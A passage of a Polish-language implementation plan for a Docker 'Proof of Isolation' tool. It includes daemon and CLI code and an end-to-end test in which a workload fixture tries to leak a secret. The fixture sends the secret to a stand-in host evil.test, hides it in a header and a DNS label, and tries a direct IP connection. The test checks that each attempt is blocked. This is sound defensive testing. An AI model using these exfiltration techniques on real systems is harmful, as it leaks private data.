    extra_ro_mounts: dict[str, str] | None = None
    max_ticks: int | None = None


def _engine(client, rt: Runtime, policy: pol.Policy, key_path: Path) -> Engine:
    w = rt.workload()
    output = (rt.run_dir / "out", policy.output_volume) if policy.output_volume else None
    tracker = StateTracker(DockerContainerFS(client, w), output)
    on_violation = rt.pause if policy.on_violation == "pause" else (lambda v: log.warning("violation: %s", v))
    return Engine(Ledger(rt.run_dir, load_key(key_path)), tracker, WalReader(rt.run_dir / "proxy-wal"),
                  LocalPublisher(rt.run_dir), policy, {"id": w.id, "image": w.attrs["Image"]},
                  on_violation=on_violation)


def loop(engine: Engine, rt: Runtime, tick_seconds: float, max_ticks: int | None = None) -> None:
    """Tick until the workload exits (then one final tick) or Ctrl-C."""
    n = 0
    try:
        while max_ticks is None or n < max_ticks:
            time.sleep(tick_seconds)
            w = rt.workload()
            w.reload()
            cp = engine.tick()
            n += 1
            log.info("checkpoint %d state=%s egress=%d", cp["seq"], cp["state"]["digest"][:12],
                     cp["egress"]["count"])
            if w.status == "exited":
                time.sleep(0.5)          # let the proxy flush the last WAL lines
                engine.tick()
                return
    except KeyboardInterrupt:
        engine.tick()


def start(spec: RunSpec, client=None) -> Runtime:
    client = client or docker.from_env()
    policy = pol.load(spec.policy_path)
    rt = Runtime(client, spec.run_dir)
    rt.prepare(spec.policy_path, spec.fingerprints, policy.upstream_insecure)
    rt.create_workload(spec.image, spec.command, policy.output_volume, spec.extra_ro_mounts)
    engine = _engine(client, rt, policy, spec.key_path)
    engine.genesis()
    rt.workload().start()
    loop(engine, rt, policy.tick_seconds, spec.max_ticks)
    return rt


def resume(run_dir: Path, key_path: Path, client=None, max_ticks: int | None = None) -> Runtime:
    client = client or docker.from_env()
    rt = Runtime(client, run_dir, RuntimeInfo.load(run_dir))
    policy = pol.load(rt.run_dir / "policy.yaml")
    engine = _engine(client, rt, policy, key_path)
    engine.resume()
    loop(engine, rt, policy.tick_seconds, max_ticks)
    return rt
```

Utwórz `src/poi/livecheck.py`:

```python
"""`poi verify --live`: recompute the container state hash from Docker and compare."""
from __future__ import annotations

from pathlib import Path

import docker

from poi import policy as pol
from poi.lthash import LtHash
from poi.runtime import RuntimeInfo
from poi.state import DockerContainerFS, StateTracker


def live_state(run_dir: Path, client=None) -> LtHash:
    client = client or docker.from_env()
    run_dir = Path(run_dir).resolve()
    info = RuntimeInfo.load(run_dir)
    policy = pol.load(run_dir / "policy.yaml")
    output = (run_dir / "out", policy.output_volume) if policy.output_volume else None
    fs = DockerContainerFS(client, client.containers.get(info.workload_id))
    return LtHash.of(StateTracker(fs, output).target(full=True).values())
```

Utwórz `src/poi/cli.py`:

```python
"""Command line: poi keygen | fingerprint | run | resume | verify | report | clean."""
from __future__ import annotations

import argparse
import json
import logging
import os
import sys
from pathlib import Path

from poi import policy as pol


def _pubkey(args) -> str:
    if args.pubkey:
        return args.pubkey
    return Path(args.pubkey_file or Path(args.run_dir) / "pubkey").read_text().strip()


def cmd_keygen(args) -> int:
    from poi.ledger import generate_key
    print(generate_key(Path(args.key)))
    return 0


def cmd_fingerprint(args) -> int:
    from poi.fingerprint import FingerprintSet
    kp = Path(args.fp_key)
    if not kp.exists():
        fd = os.open(kp, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
        with os.fdopen(fd, "wb") as f:
            f.write(os.urandom(32))
    fs = FingerprintSet.from_dir(Path(args.data), kp.read_bytes(), args.k, args.w)
    fs.save(Path(args.out))
    print(f"{len(fs.prints)} fingerprints → {args.out}")
    return 0


def cmd_run(args) -> int:
    from poi import daemon
    fps = (Path(args.fingerprints), Path(args.fp_key).read_bytes()) if args.fingerprints else None
    mounts = dict(m.split(":", 1) for m in args.mount)
    spec = daemon.RunSpec(Path(args.run_dir), Path(args.policy), Path(args.key), args.image,
                          args.cmd or None, fps, mounts)
    rt = daemon.start(spec)
    rt.teardown(keep_workload=not args.rm)
    return 0


def cmd_resume(args) -> int:
    from poi import daemon
    daemon.resume(Path(args.run_dir), Path(args.key)).teardown()
    return 0


def _verified(args):
    from poi.verify import verify_chain, verify_policy
    run = Path(args.run_dir)
    policy = pol.load(Path(args.policy) if args.policy else run / "policy.yaml")
    res = verify_chain(run, _pubkey(args))
    verify_policy(res, run, policy)
    return res, policy


def cmd_verify(args) -> int:
    from poi.verify import E_LIVE, VerifyError
    try:
        res, _ = _verified(args)
        if args.live:
            from poi.livecheck import live_state
            if live_state(Path(args.run_dir)) != res.accs["state"]:
                raise VerifyError(E_LIVE, res.last["seq"], "live container state differs from last checkpoint")
    except VerifyError as e:
        print(f"FAIL {e}", file=sys.stderr)
        return e.code
    print(f"OK {len(res.checkpoints)} checkpoints, {len(res.egress)} egress events, "
          f"state {res.last['state']['digest']}")
    return 0


def cmd_report(args) -> int:
    from poi.fingerprint import FingerprintSet
    from poi.report import build_report, render_text
    from poi.verify import VerifyError
    try:
        res, policy = _verified(args)
    except VerifyError as e:
        print(f"FAIL {e}", file=sys.stderr)
        return e.code
    fps = None
    if args.data:
        fps = FingerprintSet.from_dir(Path(args.data), Path(args.fp_key).read_bytes(),
                                      policy.fingerprint_k, policy.fingerprint_w)
    r = build_report(res, Path(args.run_dir), policy, fps)
    print(json.dumps(r, indent=2, default=str) if args.json else render_text(r))
    return 0


def cmd_clean(args) -> int:
    import docker
    from poi.runtime import Runtime, RuntimeInfo
    Runtime(docker.from_env(), Path(args.run_dir), RuntimeInfo.load(Path(args.run_dir))).teardown(keep_workload=False)
    return 0


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(prog="poi", description="Proof of Isolation")
    sub = p.add_subparsers(dest="cmd", required=True)

    s = sub.add_parser("keygen", help="generate an Ed25519 signing key")
    s.add_argument("key")
    s.set_defaults(fn=cmd_keygen)

    s = sub.add_parser("fingerprint", help="fingerprint user data for the proxy")
    s.add_argument("--data", required=True)
    s.add_argument("--fp-key", required=True, help="32-byte key file (created if missing)")
    s.add_argument("--out", required=True)
    s.add_argument("--k", type=int, default=32)
    s.add_argument("--w", type=int, default=16)
    s.set_defaults(fn=cmd_fingerprint)

    s = sub.add_parser("run", help="run a workload under attestation")
    s.add_argument("--policy", required=True)
    s.add_argument("--key", required=True)
    s.add_argument("--run-dir", required=True)
    s.add_argument("--fingerprints")
    s.add_argument("--fp-key")
    s.add_argument("--mount", action="append", default=[], help="HOST:TARGET read-only mount")
    s.add_argument("--rm", action="store_true", help="remove the workload container at the end")
    s.add_argument("image")
    s.add_argument("cmd", nargs=argparse.REMAINDER)
    s.set_defaults(fn=cmd_run)

    s = sub.add_parser("resume", help="restart the daemon for an existing run")
    s.add_argument("--key", required=True)
    s.add_argument("--run-dir", required=True)
    s.set_defaults(fn=cmd_resume)

    for name, fn in (("verify", cmd_verify), ("report", cmd_report)):
        s = sub.add_parser(name)
        s.add_argument("run_dir")
        s.add_argument("--pubkey")
        s.add_argument("--pubkey-file")
        s.add_argument("--policy")
        s.set_defaults(fn=fn)
    sub.choices["verify"].add_argument("--live", action="store_true")
    sub.choices["report"].add_argument("--data")
    sub.choices["report"].add_argument("--fp-key")
    sub.choices["report"].add_argument("--json", action="store_true")

    s = sub.add_parser("clean", help="remove the workload container and internal network")
    s.add_argument("run_dir")
    s.set_defaults(fn=cmd_clean)
    return p


def main(argv: list[str] | None = None) -> int:
    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(message)s")
    args = build_parser().parse_args(argv)
    return args.fn(args)


if __name__ == "__main__":
    sys.exit(main())
```

- [ ] **Step 4: Uruchom testy — oczekiwany PASS**

Run: `.venv/bin/pytest tests/test_cli.py -v`
Expected: wszystkie testy PASS.

- [ ] **Step 5: Commit**

```bash
git add src/poi/cli.py src/poi/daemon.py src/poi/livecheck.py tests/test_cli.py
git commit -m "feat: daemon loop, live check and CLI

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```


### Task 15: Test end-to-end z próbami wycieku + README

Prawdziwy workload próbuje wycieku: pole spoza schematu, base64 danych w dozwolonym polu, inny host (HTTP i CONNECT), bezpośrednie IP, DNS, nagłówek. Wszystko zablokowane i zalogowane; `verify --live` przechodzi; manipulacja wykryta.

**Files:**
- Create: `tests/integration/workload.py`
- Create: `tests/integration/upstream.py`
- Create: `README.md`
- Test: `tests/integration/test_isolation.py` (marker `docker`)

**Interfaces:**
- Consumes: wszystko powyżej
- Produces: —

- [ ] **Step 1: Napisz testy (najpierw muszą nie przechodzić)**

Utwórz `tests/integration/workload.py`:

```python
"""Workload used by the integration test: one legitimate call, then every exfiltration trick we test."""
import base64
import json
import socket
import urllib.error
import urllib.request

SECRET = open("/data/secret.txt", "rb").read()
API = "http://api.test/v1/score"


def post(url, payload):
    data = payload if isinstance(payload, bytes) else json.dumps(payload).encode()
    req = urllib.request.Request(url, data=data, method="POST", headers={
        "content-type": "application/json", "x-covert": base64.b64encode(SECRET[:40]).decode()})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code
    except OSError as e:
        return f"error: {type(e).__name__}"


results = {
    "allowed": post(API, {"model": "small", "count": 3}),
    "extra_field": post(API, {"model": "small", "count": 3, "leak": SECRET.decode()[:50]}),
    "note_base64_secret": post(API, {"model": "small", "count": 1,
                                     "note": base64.b64encode(SECRET[:120]).decode()}),
    "other_host": post("http://evil.test/collect", {"d": SECRET.decode()}),
    "https_other_host": post("https://evil.test/collect", {"d": SECRET.decode()}),
}
try:
    socket.create_connection(("1.1.1.1", 80), timeout=3)
    results["direct_ip"] = "connected"
except OSError:
    results["direct_ip"] = "unreachable"
label = base64.b32encode(SECRET[:30]).decode().strip("=").lower()
try:
    socket.gethostbyname(f"{label}.evil.test")
    results["dns_exfil"] = "resolved"
except OSError:
    results["dns_exfil"] = "failed"

with open("/srv/out/result.json", "w") as f:
    json.dump(results, f)
with open("/tmp/scratch.txt", "w") as f:
    f.write("intermediate")
print(json.dumps(results), flush=True)
```

Utwórz `tests/integration/upstream.py`:

```python
"""Stand-in for the allow-listed external API."""
from http.server import BaseHTTPRequestHandler, HTTPServer


class H(BaseHTTPRequestHandler):
    def do_POST(self):
        self.rfile.read(int(self.headers.get("content-length", 0)))
        body = b'{"score":0.5}'
        self.send_response(200)
        self.send_header("content-type", "application/json")
        self.send_header("content-length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


HTTPServer(("0.0.0.0", 80), H).serve_forever()
```

Utwórz `tests/integration/test_isolation.py`:

```python
"""End-to-end: real Docker, real proxy, a workload that tries to leak. Run with: pytest -m docker"""
import json
from pathlib import Path

import pytest

docker = pytest.importorskip("docker")

from poi import daemon  # noqa: E402
from poi.cli import main  # noqa: E402
from poi.fingerprint import FingerprintSet  # noqa: E402
from poi.ledger import generate_key  # noqa: E402
from poi.runtime import Runtime, build_proxy_image  # noqa: E402

HERE = Path(__file__).parent
SECRET = (b"patient: Jan Kowalski, PESEL 85010112345, diagnosis: J45.0 asthma, "
          b"address: ul. Lipowa 7, 30-001 Krakow, phone +48 600 100 200, insurer: NFZ-12-3456")

pytestmark = pytest.mark.docker


@pytest.fixture(scope="module")
def client():
    try:
        c = docker.from_env()
        c.ping()
    except Exception:
        pytest.skip("Docker not available")
    build_proxy_image(c)
    for img in ("python:3.12-slim",):
        c.images.pull(img)
    return c


@pytest.fixture(scope="module")
def finished_run(client, tmp_path_factory):
    tmp = tmp_path_factory.mktemp("poi")
    data = tmp / "data"
    data.mkdir()
    (data / "secret.txt").write_bytes(SECRET)
    fp_key = b"f" * 32
    FingerprintSet.from_dir(data, fp_key).save(tmp / "fp.bin")
    generate_key(tmp / "signing.key")
    run_dir = tmp / "run"

    upstream = {}
    real_prepare = Runtime.prepare

    def prepare_with_upstream(self, *a, **kw):
        info = real_prepare(self, *a, **kw)
        upstream["c"] = client.containers.run(
            "python:3.12-slim", ["python", "/up.py"], detach=True, name=f"poi-{info.run_id}-api",
            volumes={str(HERE / "upstream.py"): {"bind": "/up.py", "mode": "ro"}})
        client.networks.get(info.ext_network).connect(upstream["c"], aliases=["api.test"])
        return info

    Runtime.prepare = prepare_with_upstream
    try:
        rt = daemon.start(daemon.RunSpec(
            run_dir, HERE / "policy.yaml", tmp / "signing.key", "python:3.12-slim",
            ["python", "/app/workload.py"], (tmp / "fp.bin", fp_key),
            {str(HERE / "workload.py"): "/app/workload.py", str(data): "/data"}, max_ticks=60), client)
    finally:
        Runtime.prepare = real_prepare
    logs = rt.workload().logs().decode()
    upstream["c"].remove(force=True)
    rt.teardown(keep_workload=True)
    yield run_dir, data, tmp, logs
    rt.teardown(keep_workload=False)


def test_workload_saw_only_the_allowed_call_succeed(finished_run):
    run_dir, _, _, logs = finished_run
    r = json.loads(logs.strip().splitlines()[-1])
    assert r["allowed"] == 200
    assert r["extra_field"] == 403
    assert r["note_base64_secret"] == 403
    assert r["other_host"] == 403
    assert r["https_other_host"] != 200
    assert r["direct_ip"] == "unreachable"
    assert r["dns_exfil"] == "failed"


def test_verify_passes_including_live(finished_run, capsys):
    run_dir, *_ = finished_run
    assert main(["verify", str(run_dir), "--live"]) == 0, capsys.readouterr().err


def test_report_lists_every_attempt(finished_run, capsys):
    run_dir, data, tmp, _ = finished_run
    capsys.readouterr()
    assert main(["report", str(run_dir), "--json", "--data", str(data),
                 "--fp-key", str(_write(tmp / "fpk", b"f" * 32))]) == 0
    r = json.loads(capsys.readouterr().out)
    assert r["allowed_requests"] == 1
    reasons = r["blocked_by_reason"]
    assert reasons.get("schema", 0) >= 1
    assert reasons.get("fingerprint", 0) == 1
    assert reasons.get("host-not-allowed", 0) >= 2      # plain HTTP + CONNECT
    assert reasons.get("dns", 0) >= 1
    assert r["fingerprint_hits_in_allowed_traffic"] == 0
    assert any(h["verdict"] == "block" for h in r["fingerprint_hits"])


def test_tampering_with_the_run_is_detected(finished_run, tmp_path):
    import shutil
    run_dir, *_ = finished_run
    copy = tmp_path / "run"
    shutil.copytree(run_dir, copy)
    ev = sorted((copy / "evidence").glob("*.bin"))[0]
    ev.write_bytes(ev.read_bytes() + b"x")
    assert main(["verify", str(copy)]) != 0


def _write(p: Path, b: bytes) -> Path:
    p.write_bytes(b)
    return p
```

- [ ] **Step 2: Uruchom testy — oczekiwany FAIL**

Run: `.venv/bin/pytest -m docker tests/integration/test_isolation.py -v`
Expected: Testy powinny PRZEJŚĆ od razu (implementacja jest już kompletna). Jeśli któryś nie przechodzi — to błąd w zadaniach 1–14: zdiagnozuj (superpowers:systematic-debugging), nie zmieniaj asercji.

- [ ] **Step 3: Implementacja**

Utwórz `README.md`:

````markdown
# poi — Proof of Isolation

Kryptograficzny dowód (przy modelu zagrożeń: niezaufany workload, zaufany host), że dane w kontenerze
Docker nie opuściły go inaczej niż przez dozwolony, w pełni zalogowany i zgodny ze schematem kanał.
Specyfikacja: `docs/superpowers/specs/2026-10-13-proof-of-isolation-design.md`.

## Instalacja

```bash
uv venv --python 3.12 && uv pip install -e '.[dev]'
```

## Użycie

```bash
poi keygen signing.key                                   # klucz Ed25519 operatora
poi fingerprint --data ./moje_dane --fp-key fp.key --out fp.bin   # opcjonalnie: odciski danych
poi run --policy policy.yaml --key signing.key --run-dir run \
        --fingerprints fp.bin --fp-key fp.key --mount ./moje_dane:/data  IMAGE CMD...
poi verify run --live                                    # kod 0 = OK, 10–17 = rodzaj błędu
poi report run --data ./moje_dane --fp-key fp.key        # raport dla właściciela danych
poi clean run                                            # usuwa zatrzymany workload i sieć
```

Workload musi korzystać z `HTTP(S)_PROXY` i ufać CA z `SSL_CERT_FILE` (ustawiane automatycznie).

## Testy

```bash
pytest -m "not docker"      # jednostkowe
pytest -m docker            # end-to-end z prawdziwym Dockerem (buduje obraz poi-proxy:0.1)
```
````

- [ ] **Step 4: Uruchom testy — oczekiwany PASS**

Run: `.venv/bin/pytest -v && .venv/bin/python -m pyflakes src tests`
Expected: wszystkie testy PASS.

- [ ] **Step 5: Commit**

```bash
git add README.md tests/integration/test_isolation.py tests/integration/upstream.py tests/integration/workload.py
git commit -m "test: end-to-end exfiltration attempts against real Docker; README

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```


---

## Pokrycie specyfikacji

| Spec | Zadanie |
|---|---|
| §5.1 LtHash16 | 1 |
| §5.2 elementy, §6.1–6.2 formaty | 2, 3 |
| §5.3 podpisy, rotacja | 3, 4 |
| §6.3 polityka, pojemność kanału | 5 |
| §7.2 proxy: schemat, odciski, DNS, WAL | 6, 7, 8, 13 |
| §7.1/7.3 genesis, tick, §12 p.1 stan przez API | 9, 10, 14 |
| §7.4 weryfikacja (10–17) | 4, 11, 14 |
| §7.5 raport | 12, 14 |
| §8 fail-closed, restart, naruszenia | 7, 8, 10 |
| §9 granice dowodu (w raporcie) | 12 |
| §10 testy (własności, manipulacje, e2e) | 1–15 |
